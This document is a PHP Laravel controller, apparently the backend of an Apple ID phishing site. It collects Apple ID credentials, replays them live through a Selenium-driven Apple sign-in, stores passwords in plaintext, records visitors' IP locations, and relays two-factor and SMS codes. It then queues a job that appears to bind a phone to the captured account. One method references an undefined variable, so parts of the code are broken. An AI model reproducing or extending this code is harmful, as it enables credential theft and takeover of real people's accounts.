<?php

namespace App\Http\Controllers;

use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\DataConstruct\ServiceError;
use App\Apple\Service\Exception\AccountLockoutException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User\User;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Http\Integrations\IpConnector\IpConnector;
use App\Http\Integrations\IpConnector\Requests\PconLineRequest;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use App\Selenium\AppleClient\AppleConnectorFactory;
use App\Selenium\AppleClient\Elements\Phone;
use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
use App\Selenium\AppleClient\Request\SignInRequest;
use App\Selenium\ConnectorManager;
use App\Selenium\Repositories\RedisRepository;
use App\Selenium\Repositories\RepositoriesInterface;
use Carbon\Carbon;
use Facebook\WebDriver\Exception\NoSuchElementException;
use Facebook\WebDriver\Exception\TimeoutException;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Redis\RedisManager;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Psr\SimpleCache\CacheInterface;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;

class IndexController extends Controller
{

    protected RedisRepository $redisRepositories;
    protected ConnectorManager $connectorManager;


    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
        private readonly RedisManager $redisManager,
        private readonly AppleConnectorFactory $factory,
        private readonly CacheInterface $cache
    )
    {
        $this->redisRepositories = new RedisRepository($this->redisManager->client());
        $this->connectorManager = new ConnectorManager($this->redisRepositories,$this->factory);
    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {
        $guid = sha1(microtime());

        $IpConnector = new IpConnector();
        $apple = $this->appleFactory->create($guid);

        try {

            $ipaddress = $IpConnector->ipaddress(new PconLineRequest(ip: $this->request->ip()));
            $apple->getUser()->add('ipaddress',$ipaddress);

            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
        } catch (FatalRequestException|RequestException $e) {

        }

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid));
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    public function connector()
    {
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountLockoutException
     * @throws GuzzleException
     * @throws UnauthorizedException|ConnectionException|\Illuminate\Http\Client\RequestException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        $guid = $request->cookie('Guid',null);

        $connector = $this->connectorManager->createConnector();

        $response = $connector->send(new SignInRequest());

        /**
         * @var \App\Selenium\AppleClient\Page\SignIn\SignInPage $page
         */
        $page = $response->getPage();

        $page->inputAccountName($accountName);
        $page->signInAccountName();

        $page->inputPassword($password);
        $authPage = $page->signInPassword();

        $account = Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);

        $user = new User($this->cache,$guid);

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));

        $this->connectorManager->add($guid,$connector);

        if ($authPage instanceof SignInSelectPhonePage){

            $phoneList = $authPage->getPhoneLists();

            $user->setPhoneInfo(array_map(static fn(Phone $phone) => $phone->setElement(),$phoneList->all()));

            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
            ],code: 202);
        }

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => true,
        ],code: 201);
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     * @throws GuzzleException
     * @throws UnauthorizedException|ConnectionException
     */
    public function authPhoneList(CacheInterface $cache): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
    {
        $guid = $this->request->input('Guid',null);

        $user = new User($cache,$guid);

        return view('index.auth-phone-list',['trustedPhoneNumbers' => collect($user->getPhoneInfo())]);
    }

    /**
     * 验证安全码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect|ConnectionException
     */
    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();
        $code = $validated['apple_verifycode'];
        $guid = $this->request->input('Guid');

        $account = $this->getAccount();

        try {

            $response = $this->getApple()->validateSecurityCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
        } catch (VerificationCodeIncorrect $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid)
            ->delay(Carbon::now()->addSeconds(10));

        return $this->success($response->json() ?? []);
    }

    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
    {
        return Account::where('account', $accountName)->first();
    }

    /**
     * 验证手机验证码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect
     * @throws ConnectionException
     */
    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        if (empty($Id = $validated['ID'])){
            throw new VerificationCodeIncorrect('手机号码ID不能为空');
        }

        $code = $validated['apple_verifycode'];

        $guid = $this->request->input('Guid');

        $account = $this->getAccount();

        // 验证手机号码
        try {

            $response = $this->getApple()->validatePhoneSecurityCode($code,(int) $Id);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));
        } catch (VerificationCodeIncorrect|UnauthorizedException|ConnectionException $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid)
            ->delay(Carbon::now()->addSeconds(10));

        return $this->success($response->json() ?? []);
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws UnauthorizedException|ConnectionException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $apple = $this->getApple();

        try {

            $response = $apple->idmsa->sendSecurityCode()->json();

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => '获取安全码成功',
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => "获取安全码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        return $this->success($response);
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws GuzzleException|ConnectionException
     */
    public function GetPhone(): JsonResponse
    {
        $response = $this->getApple()->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumbers?->getId(),
            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
        ]);
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws NoSuchElementException
     * @throws TimeoutException
     * @throws ValidationException
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:0',
        ])->validated();

        try {


            $guid = $this->request->input('Guid');

            $connector = $this->connectorManager->getConnector($guid);

            $page = new SignInSelectPhonePage($connector->webDriver());
            $page->selectPhone($params['ID']);

//            $user = new User($cache,$guid);

            $this->getAccount()
                ?->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码成功",
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ?->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        /**
         * @var $error ServiceError
         */
        $error = $response->getServiceErrors()->first();

        Session::flash('Error',$error?->getMessage());

        return $this->success($response->json());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
